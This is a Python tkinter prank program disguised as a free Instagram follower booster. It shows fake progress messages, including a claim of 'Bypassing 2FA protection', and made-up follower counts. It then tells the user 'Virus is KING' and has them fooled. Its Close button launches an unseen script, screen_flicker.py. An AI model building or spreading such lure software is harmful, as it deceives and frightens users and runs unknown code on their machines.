import tkinter as tk
import threading
import time
import random
import subprocess
import os
import math

def instaliker():
    root = tk.Tk()
    root.title("InstaBoost Free Tool")
    root.geometry("500x400")
    root.configure(bg="white")

    tk.Label(root, text="InstaBoost Tool", font=("Arial", 20, "bold"), bg="white", fg="blue").pack(pady=20)
    tk.Label(root, text="Boost Your Instagram Followers", font=("Arial", 12), bg="white").pack()

    tk.Label(root, text="Enter Instagram Username:", font=("Arial", 12), bg="white").pack(pady=20)
    username_entry = tk.Entry(root, font=("Arial", 12), width=25)
    username_entry.pack()

    status_label = tk.Label(root, text="", font=("Arial", 12), bg="white", fg="green")
    status_label.pack(pady=10)

    # Circular Loading Animation
    canvas = tk.Canvas(root, width=35, height=35, bg="white", highlightthickness=0)
    canvas.pack(pady=5)
    loading_id = None
    angle = 0

    def draw_loading():
        nonlocal loading_id, angle
        if loading_id:
            canvas.delete(loading_id)
        angle = (angle + 5) % 360
        loading_id = canvas.create_arc(2, 2, 25, 25, start=angle, extent=270, style="arc", outline="blue", width=4)
        if not status_label.cget("text").endswith("Complete!"):
            root.after(50, draw_loading)

    count_label = tk.Label(root, text="Followers Sent: 0", font=("Arial", 12), bg="white", fg="purple")
    count_label.pack(pady=10)

    def start_boost():
        username = username_entry.get().strip()
        if not username:
            status_label.config(text="❌ Please enter your username", fg="red")
            return

        def process():
            nonlocal angle
            draw_loading()  # Start circular loading animation
            connection_steps = [
                "Connecting to Instagram...",
                "Validating username...",
                "Bypassing 2FA protection...",
                "Syncing with IG servers..."
            ]
            for step in connection_steps:
                status_label.config(text=step, fg="green")
                root.update()
                time.sleep(1.5)

            canvas.delete(loading_id)  # Stop loading animation
            status_label.config(text="Boosting Followers...", fg="green")
            total_followers = 0
            for _ in range(5):
                added = random.randint(100, 300)
                total_followers += added
                count_label.config(text=f"Followers Sent: {total_followers}")
                root.update()
                time.sleep(random.uniform(0.8, 1.5))

            status_label.config(text="✅ Boost Complete!", fg="green")
            time.sleep(1.5)
            reveal_truth(username)

        threading.Thread(target=process, daemon=True).start()

    def reveal_truth(username):
        for widget in root.winfo_children():
            widget.destroy()

        tk.Label(root, text="😂 YOU GOT FOOLED!", font=("Arial", 20, "bold"), fg="red", bg="white").pack(pady=80)
        tk.Label(root, text=f"@{username}, This Was a TRAP.\nVirus is KING 👑, You Got FOOOLED 🤡", font=("Arial", 14), fg="black", bg="white").pack()
        tk.Button(root, text="Close 😬", command=trigger_screen_flicker, font=("Arial", 12), bg="red", fg="white", padx=10, pady=5).pack(pady=40)

    def trigger_screen_flicker():
        try:
            if os.name == "posix":
                subprocess.Popen(["python3", "screen_flicker.py"])
            else:
                subprocess.Popen(["python", "screen_flicker.py"])
        except Exception as e:
            print(f"Error launching screen_flicker.py: {e}")
        root.destroy()

    tk.Button(root, text="🔥 Boost Now", command=start_boost, font=("Arial", 14), bg="blue", fg="white", padx=20, pady=10).pack(pady=20)
    root.mainloop()

if __name__ == "__main__":
    instaliker()